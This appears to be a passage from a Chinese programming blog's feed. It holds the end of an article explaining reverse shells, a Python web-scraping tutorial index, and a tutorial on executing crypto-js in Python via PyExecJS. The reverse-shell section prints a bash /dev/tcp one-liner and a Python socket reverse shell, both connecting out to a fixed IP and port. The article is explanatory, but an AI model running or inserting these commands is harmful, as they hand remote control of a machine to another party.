class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">111.112</span>.<span class="number">113.114</span>/<span class="number">32767</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre>      </td>    </tr>  </table></figure><p>这个命令大致解释下：</p><ul>  <li>    <p><code>bash -i</code> 就是产生一个 bash 交互环境</p>  </li>  <li>    <p><code>&gt;&amp;</code>可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方</p>  </li>  <li>    <p><code>/dev/tcp/111.112.113.114/32767</code> 其实指的就是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接。</p>  </li>  <li>    <p><code>0&gt;&amp;1</code>可以将标准输入和标准输出相结合，重定向给前面标准输出的内容。</p>  </li></ul><p>通过这样的命令，我们就可以就是将 B的标准输出和错误输出都重定向给 A，并且将 A 的输入都重定向给 B，这样我们就可以实现 A 对 B 的远程控制了，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/bjm7a.png" alt=""></p><p>比如这样我们就可以轻松在 A 主机上拿到 B 主机的主机名、当前所处路径等内容了。</p><p>另外除了用 bash，我们还可以利用 Python 进行反弹 Shell，脚本如下：</p><figure class="highlight powershell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">python <span class="literal">-c</span> <span class="string">'import socket,subprocess,os; \</span></span><br><span class="line"><span class="string">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span></span><br><span class="line"><span class="string">s.connect(("111.112.113.114",32767));</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),0);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),1);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);</span></span><br><span class="line"><span class="string">p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre>      </td>    </tr>  </table></figure><p>可以达到同样反弹 Shell 的效果，即可以用 A 来控制 B。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是反弹 Shell 的介绍，灵活运用反弹 Shell 可以大大便利某些场景下的远程控制，希望对大家有帮助。</p><p>更多精彩内容，请关注我的公众号「进击的 Coder」和「崔庆才丨静觅」。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间被一位产品经理嘲笑了，说我居然连反弹 Shell 都不知道！&lt;/p&gt;
&lt;p&gt;说实话当时我还真不知道，但这口气咽不下去啊，得赶紧学来看看，这不，我已经学会了！&lt;/p&gt;
&lt;p&gt;学完之后我特地来记录下，同时分享给大家，以后产品经理再也不敢嘲笑我们不懂反弹 Shell 了！
      
    
    </summary>
    
    
      <category term="技术杂谈" scheme="https://cuiqingcai.com/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="Shell" scheme="https://cuiqingcai.com/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】崔庆才 Python3 网络爬虫学习教程</title>
    <link href="https://cuiqingcai.com/17777.html"/>
    <id>https://cuiqingcai.com/17777.html</id>
    <published>2022-03-13T06:14:48.000Z</published>
    <updated>2022-08-01T15:41:25.996Z</updated>
    
    <content type="html"><![CDATA[<p>大家好，我是崔庆才，非常高兴能在此处与您相见，无论您对爬虫有所涉猎还是初学爬虫，我希望我撰写的本 Python 爬虫系列教程能对您有所帮助。</p><p>要学爬虫，首推的就是 Python 语言，简单快速易上手，且 Python 语言的爬虫生态极其丰富。</p><p>我个人于 2015 年研究 Python 爬虫技术，并于 2018 年出版了个人第一版爬虫书<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMjMzMzU0MC5odG1s">《Python3 网络爬虫开发实战》<i class="fa fa-external-link-alt"></i></span>，出版至今，此本书一直处于市面上所有爬虫书的销冠位置，销量 10w 册，<span class="exturl" data-url="aHR0cHM6Ly9ib29rLmRvdWJhbi5jb20vc3ViamVjdC8zMDE3NTU5OC8=">豆瓣评分<i class="fa fa-external-link-alt"></i></span> 9.0。</p><p>Python 爬虫技术的基本内容包括网页基础分析、requests 请求、XPath 和正则解析、Ajax 分析、Selenium 模拟浏览器爬取、Scrapy 等知识点，但技术不是一成不变的，随着近几年时代的发展，一些新兴爬虫技术如异步爬虫、JavaScript 逆向、AST 技术、安卓逆向、Hook、智能解析、WebAssembly、大规模分布式、Docker、Kubernetes 等技术不断涌现，而现在网上的爬虫文章也存在着极大问题，一个是内容泛滥不堪、同质化严重，另一个是几乎没有几篇博文能紧跟前沿技术，多数还停留在几年前的水平，而且很多爬虫教程所用案例已经非常老旧而且多数也无法运行，这极大地打击了初学者的自信心。</p><p>因此，2022 年了，有一套内容全面的、紧跟前沿技术的、案例稳定运行的爬虫教程可谓是非常难得。</p><p>是的，所以在 2021 年底，我又出版了<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>，对旧的爬虫技术内容进行了全面更新，搭建了全新的案例平台进行全面讲解，</p><p><strong>目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就这一套教程了，当然书的话也仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>可以做到。</strong></p><p>本教程内容多数来自于<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>，本教程对书中内容进行了精简和梳理，尽量覆盖到最新的知识点，当然更全面的内容可以购买<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了解更多。</p><p>以下为 Python3 网络爬虫学习教程内容：</p><h2 id="爬虫基础入门"><a href="#爬虫基础入门" class="headerlink" title="爬虫基础入门"></a>爬虫基础入门</h2><ol>  <li><a href="https://cuiqingcai.com/202211.html">什么是爬虫？</a></li>  <li><a href="https://cuiqingcai.com/202212.html">HTTP 基本原理</a></li>  <li><a href="https://cuiqingcai.com/202213.html">Web 网页基础</a></li>  <li><a href="https://cuiqingcai.com/202214.html">Session 和 Cookie</a></li>  <li><a href="https://cuiqingcai.com/202221.html">urllib 爬虫初体验</a></li>  <li><a href="https://cuiqingcai.com/202222.html">方便好用的 requests</a></li>  <li><a href="https://cuiqingcai.com/202223.html">强大灵活的正则表达式</a></li>  <li><a href="https://cuiqingcai.com/202224.html">基础爬虫案例爬取实战</a></li></ol><h2 id="页面解析和数据存储"><a href="#页面解析和数据存储" class="headerlink" title="页面解析和数据存储"></a>页面解析和数据存储</h2><ol>  <li><a href="https://cuiqingcai.com/202231.html">网页解析利器 XPath 初体验</a></li>  <li><a href="https://cuiqingcai.com/202232.html">新兴网页解析利器 parsel </a></li>  <li><a href="https://cuiqingcai.com/202241.html">简易的 TXT 纯文本文件存储</a></li>  <li><a href="https://cuiqingcai.com/202242.html">方便灵活的 JSON 文本文件存储</a></li>  <li><a href="https://cuiqingcai.com/202243.html">高效实用的 MongoDB 文档存储</a></li>  <li><a href="https://cuiqingcai.com/202244.html">关系型数据库 MySQL 存储</a></li>  <li><a href="https://cuiqingcai.com/202245.html">当爬虫遇见 RabbitMQ 消息队列</a></li>  <li><a href="https://cuiqingcai.com/202246.html">便于高效检索的 Elasticsearch 存储</a></li></ol><h2 id="Ajax-分析和动态渲染页面爬取"><a href="#Ajax-分析和动态渲染页面爬取" class="headerlink" title="Ajax 分析和动态渲染页面爬取"></a>Ajax 分析和动态渲染页面爬取</h2><ol>  <li><a href="https://cuiqingcai.com/202251.html">什么是 Ajax？</a></li>  <li><a href="https://cuiqingcai.com/202252.html">Ajax 分析方法</a></li>  <li><a href="https://cuiqingcai.com/202253.html">Ajax 案例爬取实战</a></li>  <li><a href="https://cuiqingcai.com/202261.html">经典动态渲染工具 Selenium 的使用</a></li>  <li><a href="https://cuiqingcai.com/202262.html">新兴动态渲染工具 Playwright 的使用</a></li></ol><h2 id="异步爬虫和模拟登录"><a href="#异步爬虫和模拟登录" class="headerlink" title="异步爬虫和模拟登录"></a>异步爬虫和模拟登录</h2><ol>  <li><a href="https://cuiqingcai.com/202271.html">协程的基本原理</a></li>  <li><a href="https://cuiqingcai.com/202272.html">aiohttp 的基本使用</a></li>  <li><a href="https://cuiqingcai.com/202281.html">模拟登录的基本原理</a></li>  <li><a href="https://cuiqingcai.com/202282.html">Session + Cookie 模拟登录爬取实战</a></li></ol><h2 id="验证码的处理"><a href="#验证码的处理" class="headerlink" title="验证码的处理"></a>验证码的处理</h2><ol>  <li><a href="https://cuiqingcai.com/202291.html">OCR 识别验证码</a></li>  <li><a href="https://cuiqingcai.com/202292.html">OpenCV 图像匹配识别滑动验证码缺口</a></li>  <li><a href="https://cuiqingcai.com/202293.html">深度学习识别滑动验证码缺口</a></li></ol><h2 id="代理的使用"><a href="#代理的使用" class="headerlink" title="代理的使用"></a>代理的使用</h2><ol>  <li><a href="https://cuiqingcai.com/2022101.html">代理的基本原理</a></li>  <li><a href="https://cuiqingcai.com/2022102.html">代理的基本使用</a></li>  <li><a href="https://cuiqingcai.com/2022103.html">高效代理池的维护</a></li>  <li><a href="https://cuiqingcai.com/2022104.html">ADSL 拨号代理的使用</a></li></ol><h2 id="JavaScript-混淆、逆向技术"><a href="#JavaScript-混淆、逆向技术" class="headerlink" title="JavaScript 混淆、逆向技术"></a>JavaScript 混淆、逆向技术</h2><ol>  <li><a href="https://cuiqingcai.com/2022111.html">JavaScript 网站加密和混淆技术简介</a></li>  <li><a href="https://cuiqingcai.com/2022112.html">JavaScript 逆向调试技巧</a></li>  <li><a href="https://cuiqingcai.com/2022113.html">JavaScript Hook 的用法</a></li>  <li><a href="https://cuiqingcai.com/2022114.html">Python 模拟执行 JavaScript</a></li></ol><h2 id="App-爬虫和安卓逆向"><a href="#App-爬虫和安卓逆向" class="headerlink" title="App 爬虫和安卓逆向"></a>App 爬虫和安卓逆向</h2><h2 id="页面智能解析"><a href="#页面智能解析" class="headerlink" title="页面智能解析"></a>页面智能解析</h2><h2 id="Scrapy-框架和分布式爬虫"><a href="#Scrapy-框架和分布式爬虫" class="headerlink" title="Scrapy 框架和分布式爬虫"></a>Scrapy 框架和分布式爬虫</h2><h2 id="爬虫的部署、维护、监控"><a href="#爬虫的部署、维护、监控" class="headerlink" title="爬虫的部署、维护、监控"></a>爬虫的部署、维护、监控</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;大家好，我是崔庆才，非常高兴能在此处与您相见，无论您对爬虫有所涉猎还是初学爬虫，我希望我撰写的本 Python 爬虫系列教程能对您有所帮助。&lt;/p&gt;
&lt;p&gt;要学爬虫，首推的就是 Python 语言，简单快速易上手，且 Python 语言的爬虫生态极其丰富。&lt;/p&gt;
&lt;p&gt;我
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="崔庆才" scheme="https://cuiqingcai.com/tags/%E5%B4%94%E5%BA%86%E6%89%8D/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="Python爬虫" scheme="https://cuiqingcai.com/tags/Python%E7%88%AC%E8%99%AB/"/>
    
      <category term="爬虫教程" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/"/>
    
      <category term="Python爬虫书" scheme="https://cuiqingcai.com/tags/Python%E7%88%AC%E8%99%AB%E4%B9%A6/"/>
    
      <category term="Python3爬虫教程" scheme="https://cuiqingcai.com/tags/Python3%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/"/>
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】Python3 爬虫教程 - Python 模拟执行 JavaScript</title>
    <link href="https://cuiqingcai.com/2022114.html"/>
    <id>https://cuiqingcai.com/2022114.html</id>
    <published>2022-03-12T07:11:34.000Z</published>
    <updated>2022-08-01T15:41:25.996Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>爬虫系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了，<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">点击了解详情<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>前面我们了解了一些 JavaScript 逆向的调试技巧，通过一些方法，我们可以找到一些突破口，进而找到关键的方法定义。</p><p>比如说，通过一些调试，我们找到了一个加密参数 token 是由某一个叫做 encrypt 方法产生的，如果里面的逻辑相对简单的话，那其实我们可以用 Python 完全重写一遍。但是现实情况往往不是这样的，一般来说，一些加密相关的方法通常会引用一些相关标准库，比如说 JavaScript 就有一个广泛使用的库，叫做 crypto-js，GitHub 仓库链接是：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JyaXgvY3J5cHRvLWpz77yM6L+Z5Liq5bqT5a6e546w5LqG5b6I5aSa5Li75rWB55qE5Yqg5a+G566X5rOV77yM5YyF5ous5a+556ew5Yqg5a+G44CB6Z2e5a+556ew5Yqg5a+G44CB5a2X56ym57yW56CB562J562J77yM5q+U5aaC5a+55LqO">https://github.com/brix/crypto-js，这个库实现了很多主流的加密算法，包括对称加密、非对称加密、字符编码等等，比如对于<i class="fa fa-external-link-alt"></i></span> AES 加密，通常我们需要输入待加密文本和加密密钥，实现如下：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> ciphertext = CryptoJS.AES.encrypt(message, key).toString();</span><br></pre>      </td>    </tr>  </table></figure><p>对于这样的情况，我们其实就没法很轻易地完全重写一遍了，因为 Python 中并不一定有和 JavaScript 完全一样的类库。</p><p>那有什么解决办法吗？有的，既然 JavaScript 已经实现好了，那我用 Python 直接模拟执行这些 JavaScript 得到结果不就好了吗？</p><p>所以，本节我们就来了解下使用 Python 模拟执行 JavaScript 的解决方案。</p><h2 id="1-案例引入"><a href="#1-案例引入" class="headerlink" title="1. 案例引入"></a>1. 案例引入</h2><p>这里我们先看一个和上文描述的情形非常相似的案例，链接是：<span class="exturl" data-url="aHR0cHM6Ly9zcGE3LnNjcmFwZS5jZW50ZXIv77yM5aaC5Zu+5omA56S677ya">https://spa7.scrape.center/，如图所示：<i class="fa fa-external-link-alt"></i></span></p><p><img src="https://qiniu.cuiqingcai.com/hft6o.png" alt="image-20210825014021855"></p><p>这是一个 NBA 球星网站，用卡片的形式展示了一些球星的基本信息，另外每一张卡片上其实都有一个加密字符串，这个加密字符串其实和球星的相关信息是有关联的，每个球星的 加密字符串也是不同的。</p><p>所以，这里我们要做的就是找出这个加密字符串的加密算法并用程序把加密字符串的生成过程模拟出来。</p><h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h2><p>由于本节我们需要使用 Python 模拟执行 JavaScript，这里我们使用的库叫做 PyExecJS，我们使用 pip3 安装即可，命令如下：</p><figure class="highlight cmake">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">pip3 <span class="keyword">install</span> pyexecjs</span><br></pre>      </td>    </tr>  </table></figure><p>PyExecJS 是用于执行 JavaScript 的，但执行 JavaScript 的功能需要依赖一个 JavaScript 运行环境，所以除了安装好这个库之外，我们还需要安装一个 JavaScript 运行环境，个人比较推荐的是 Node.js，所以我们还需要安装下 Node.js，可以到 <span class="exturl" data-url="aHR0cHM6Ly9ub2RlanMub3JnLw==">https://nodejs.org/<i class="fa fa-external-link-alt"></i></span> 下载安装。更加详细的安装和配置过程可以参考：<span class="exturl" data-url="aHR0cHM6Ly9zZXR1cC5zY3JhcGUuY2VudGVyL3B5ZXhlY2pz44CC">https://setup.scrape.center/pyexecjs。<i class="fa fa-external-link-alt"></i></span></p><p>PyExecJS 库在运行时会检测本地 JavaScript 运行环境来实现 JavaScript 执行，做好如上准备工作之后， 接着我们运行代码检查一下运行环境：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line">print(execjs.get().name)</span><br></pre>      </td>    </tr>  </table></figure><p>运行结果类似如下：</p><figure class="highlight crmsh">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">Node</span>.<span class="title">js</span> (V8)</span><br></pre>      </td>    </tr>  </table></figure><p>如果你成功安装好 PyExecJS 库和 Node.js 的话，其结果就是 Node.js (V8)，当然如果你安装的是其他的 JavaScript 运行环境，结果也会有所不同。</p><h2 id="3-分析"><a href="#3-分析" class="headerlink" title="3. 分析"></a>3. 分析</h2><p>接下来我们就对这个网站稍作分析，打开 Sources 面板，我们可以非常轻易地找到加密字符串的生成逻辑，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/jqozz.png" alt="image-20210826034346308"></p><p>首先声明了一个球员相关的列表，如：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">const</span> players = [</span><br><span class="line">  &#123;</span><br><span class="line">    name: <span class="string">'凯文-杜兰特'</span>,</span><br><span class="line">    image: <span class="string">'durant.png'</span>,</span><br><span class="line">    birthday: <span class="string">'1988-09-29'</span>,</span><br><span class="line">    height: <span class="string">'208cm'</span>,</span><br><span class="line">    weight: <span class="string">'108.9KG'</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">]</span><br></pre>      </td>    </tr>  </table></figure><p>然后对于每一个球员，都把每个球员的信息调用了加密算法进行了加密，我们可以打个断点看下：</p><p><img src="https://qiniu.cuiqingcai.com/hhqxx.png" alt="image-20210825014950392"></p><p>这里我们可以看到，getToken 方法的输入就是单个球员的信息，就是上述列表的一个元素对象，然后 <code>this.key</code> 就是一个固定的字符串。整个加密逻辑就是提取了球员的名字、生日、身高、体重，然后先 Base64 编码然后再进行 DES 加密，最后返回结果。</p><p>加密算法是怎么实现的呢？其实就是依赖了 crypto-js 库，使用了 CryptoJS 对象来实现的。</p><p>那 CryptoJS 这个对象是哪里来的呢？总不能凭空产生吧？其实这个网站就是直接引用了这个库，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/3k2i9.png" alt="image-20210826035113504"></p><p>引用这个 JavaScript 文件之后，CryptoJS 就被注入到浏览器全局环境下了，因此我们就可以在别的方法里面直接使用 CryptoJS 对象里面的方法了。</p><h2 id="4-模拟调用"><a href="#4-模拟调用" class="headerlink" title="4. 模拟调用"></a>4. 模拟调用</h2><p>好，那既然这样，我们要怎么模拟呢？下面我们来实现下。</p><p>首先，我们要模拟的其实就是这个 getToken 方法，输入球员相关信息，得到最终的加密字符串，这里我们直接把 key 替换下，把 getToken 方法稍微改写如下：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function">function <span class="title">getToken</span><span class="params">(player)</span> </span>&#123;</span><br><span class="line">  let key = CryptoJS.enc.Utf8.parse(<span class="string">"fipFfVsZsTda94hJNKJfLoaqyqMZFFimwLt"</span>);</span><br><span class="line">  <span class="keyword">const</span> &#123; name, birthday, height, weight &#125; = player;</span><br><span class="line">  let base64Name = CryptoJS.enc.Base64.stringify(CryptoJS.enc.Utf8.parse(name));</span><br><span class="line">  let encrypted = CryptoJS.DES.encrypt(</span><br><span class="line">    `$&#123;base64Name&#125;$&#123;birthday&#125;$&#123;height&#125;$&#123;weight&#125;`,</span><br><span class="line">    key,</span><br><span class="line">    &#123;</span><br><span class="line">      mode: CryptoJS.mode.ECB,</span><br><span class="line">      padding: CryptoJS.pad.Pkcs7,</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> encrypted.toString();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>因为这个方法的模拟执行是需要 CryptoJS 这个对象的，如果我们直接调用这个方法肯定会报 CryptoJS 未定义的错误。</p><p>那怎么办呢？我们只需要再模拟执行下刚才看到的 crypto-js.min.js 不就好了吗？</p><p>OK，所以，我们需要模拟执行的内容就是两部分：</p><ul>  <li>模拟运行 crypto-js.min.js 里面的 JavaScript，用于声明 CryptoJS 对象。</li>  <li>模拟运行 getToken 方法的定义，用于声明 getToken 方法。</li></ul><p>好，接下来我们就把 crypto-js.min.js 里面的代码和上面 getToken 方法的代码复制一下，都粘贴到一个 JavaScript 文件里面，比如就叫做 crypto.js。</p><p>接下来我们就用 PyExecJS 模拟执行一下吧，代码如下：</p><figure class="highlight python">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">item = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'凯文-杜兰特'</span>,</span><br><span class="line">    <span class="string">'image'</span>: <span class="string">'durant.png'</span>,</span><br><span class="line">    <span class="string">'birthday'</span>: <span class="string">'1988-09-29'</span>,</span><br><span class="line">    <span class="string">'height'</span>: <span class="string">'208cm'</span>,</span><br><span class="line">    <span class="string">'weight'</span>: <span class="string">'108.9KG'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file = <span class="string">'crypto.js'</span></span><br><span class="line">node = execjs.get()</span><br><span class="line">ctx = node.compile(open(file).read())</span><br><span class="line"></span><br><span class="line">js = <span class="string">f"getToken(<span class="subst">&#123;json.dumps(item, ensure_ascii=<span class="literal">False</span>)&#125;</span>)"</span></span><br><span class="line">print(js)</span><br><span class="line">result = ctx.eval(js)</span><br><span class="line">print(result)</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们单独定义了一位球员的信息，赋值为 item 变量。然后使用 execjs 的 get 方法获取了 JavaScript 执行环境，赋值为 node。</p><p>接着我们调用了 node 的 compile 方法，传入了刚才定义的 crypto.js 文件的文本内容，compile 方法会返回一个 JavaScript 的上下文对象，我们赋值为 ctx。执行到这里，其实就可以理解为，ctx 对象里面就执行过了 crypto-js.min.js，CryptoJS 就声明好了，然后也执行过了 getToken 的定义，所以 getToken 方法也定义好了，相当于完成了一些初始化的工作。</p><p>接着，我们只需要定义好我们想要执行的 JavaScript 代码就好了，我们定义了一个 js 变量，其实就是模拟调用了 getToken 方法并传入了球员信息，我们打印了下 js 变量的值，内容如下：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="function"><span class="title">getToken</span><span class="params">(&#123;<span class="string">"name"</span>: <span class="string">"凯文-杜兰特"</span>, <span class="string">"image"</span>: <span class="string">"durant.png"</span>, <span class="string">"birthday"</span>: <span class="string">"1988-09-29"</span>, <span class="string">"height"</span>: <span class="string">"208cm"</span>, <span class="string">"weight"</span>: <span class="string">"108.9KG"</span>&#125;)</span></span></span><br></pre>      </td>    </tr>  </table></figure><p>其实这就是一个标准的 JavaScript 方法调用的写法而已。</p><p>接着我们调用 ctx 对象的 eval 方法并传入 js 变量，其实就是模拟执行了这句 JavaScript 代码，照理来说最终返回的就是加密字符串了。</p><p>然而，运行之后，我们可能看到这个报错：</p><figure class="highlight css">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="selector-tag">execjs</span><span class="selector-class">._exceptions</span><span class="selector-class">.ProgramError</span>: <span class="selector-tag">ReferenceError</span>: <span class="selector-tag">CryptoJS</span> <span class="selector-tag">is</span> <span class="selector-tag">not</span> <span class="selector-tag">defined</span></span><br></pre>      </td>    </tr>  </table></figure><p>很奇怪，CryptoJS 未定义？我们明明执行过 crypto-js.min.js 里面的内容了呀？</p><p>问题其实出在 crypto-js.min.js 里面，可以看到其里面声明了一个 JavaScript 的自执行方法，如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/2rxkp.png" alt="image-20210825020403826"></p><p>自执行方法什么意思呢？就是声明了一个方法，然后紧接着调用执行，我们可以看下这个例子：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">!(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"result"</span>, a, b);</span><br><span class="line">&#125;)(<span class="number">1</span>, <span class="number">2</span>);</span><br></pre>      </td>    </tr>  </table></figure><p>这里我们先声明了一个 function，然后接收 a 和 b 两个参数，然后把内容输出出来，然后我们把这个 function 用小括号括起来，这其实就是一个方法，可以被直接调用的，怎么调用呢？后面再跟上对应的参数就好了，比如传入 1 和 2，执行结果如下：</p><figure class="highlight angelscript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">result <span class="number">1</span> <span class="number">2</span></span><br></pre>      </td>    </tr>  </table></figure><p>可以看到，这个自执行的方法就被执行了。</p><p>同理地，crypto-js.min.js 也符合这个格式，它接收 t 和 e 两个参数，t 就是 this，其实就是浏览器中的 window 对象，e 就是一个 function（用于定义 CryptoJS 的核心内容）。</p><p>我们再来观察下 crypto-js.min.js 开头的定义：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="string">"object"</span> == <span class="keyword">typeof</span> exports</span><br><span class="line">  ? (<span class="built_in">module</span>.exports = exports = e())</span><br><span class="line">  : <span class="string">"function"</span> == <span class="keyword">typeof</span> define &amp;&amp; define.amd</span><br><span class="line">  ? define([], e)</span><br><span class="line">  : (t.CryptoJS = e());</span><br></pre>      </td>    </tr>  </table></figure><p>在 Node.js 中，其实 exports 就是用来将一些对象的定义进行导出的，这里 <code>&quot;object&quot; == typeof exports</code> 其实结果就是 true，所以就执行了 <code>module.exports = exports = e()</code> 这段代码，这样就相当于把 <code>e()</code> 作为整体导出了，而这个 <code>e()</code> 其实就对应这后面的整个 function，function 里面定义了加密相关的各个实现，其实就指代整个加密算法库。</p><p>但是在浏览器中，其结果就不一样了，浏览器环境中并没有 exports 和 define 这两个对象。所以，上述代码在浏览器中最后执行的就是 <code>t.CryptoJS = e()</code> 这段代码，其实这里就是把 CryptoJS 对象挂载到 this 对象上面，而 this 就是浏览器中的全局 window 对象，后面就可以直接用了。如果我们把代码放在浏览器中运行，那是没有任何问题的。</p><p>然而，我们使用的 PyExecJS 是依赖于一个 Node.js 执行环境的，所以上述代码其实执行的是 <code>module.exports = exports = e()</code>，这里面并没有声明 CryptoJS 对象，也没有把 CryptoJS 挂载到全局对象里面，所以后面我们再调用 CryptoJS 就自然而然出现了未定义的错误了。</p><p>那怎么办呢？其实很简单，那我们直接声明一个 CryptoJS 变量，然后手动声明一下它的初始化不就好了吗？所以我们可以把代码稍作修改，改成如下内容：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 